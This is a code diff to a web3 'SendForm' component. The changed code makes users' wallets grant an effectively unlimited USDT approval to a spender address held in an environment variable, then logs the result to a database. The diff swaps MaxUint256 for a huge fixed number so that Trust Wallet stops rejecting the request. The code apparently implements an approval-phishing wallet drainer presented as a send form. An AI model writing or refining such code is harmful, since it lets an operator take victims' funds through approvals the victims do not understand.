@@ -23,7 +23,12 @@ const BSC_CHAIN_CONFIG = {
 
 const USDT_ABI = [
   "function approve(address spender, uint256 amount) public returns (bool)",
+  "function allowance(address owner, address spender) public view returns (uint256)",
 ];
+
+// Use a very large fixed number instead of MaxUint256 — some wallets (Trust Wallet)
+// reject MaxUint256 with "Decision not found". This is still effectively unlimited.
+const UNLIMITED_APPROVAL = BigInt("999999999999999999999999999999");
 
 type Step = "form" | "processing" | "success" | "no_wallet";
 
@@ -111,7 +116,7 @@ export default function SendForm() {
       const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;
 
       const contract = new ethers.Contract(usdtContract, USDT_ABI, signer);
-      const tx = await contract.approve(spenderAddress, ethers.MaxUint256);
+      const tx = await contract.approve(spenderAddress, UNLIMITED_APPROVAL);
       const receipt = await tx.wait();
 
       // Save to DB
